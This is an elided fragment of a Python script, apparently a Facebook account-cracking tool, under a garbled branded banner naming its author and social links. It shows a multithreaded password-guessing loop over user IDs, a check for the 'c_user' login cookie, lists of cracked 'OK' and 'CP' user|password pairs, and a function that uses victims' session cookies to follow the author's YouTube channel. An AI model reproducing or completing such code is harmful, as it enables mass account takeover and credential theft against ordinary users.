...
\033[1;35mÃ¢Å“â€¦____________________Ã°Å¸â€™Å¸________________________Ã¢Å“â€¦

  Auther   : MUSA KHAN
  \033[1;37mTEAM     : DADAX  MUSA  MALGHA LARA 
  \033[1;36mYoutube  : MUSA TRACK naðŸ™‚ðŸ’”
  \033[1;37mNote     : FREE TOLL
  \033[1;35maccount Fb : https://www.facebook.com/doran.khh?mibextid=ZbWKwL
Ã¢Å“â€¦____________________Ã°Å¸â€™Å¸________________________Ã¢Å“â€¦
"""
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back MUSA Menu ")
	    mr()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[MUSA] {loop}|{len(self.id)} \033[1;32m[ok][{len(ok)}] \033[1;31m[cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [MUSA-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://youtube.com/@musatricks9563', cookies={'cookie': coki}).text, 'html.parser')
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with mrFOYSAL(max_workers=30) as MUSAworld:
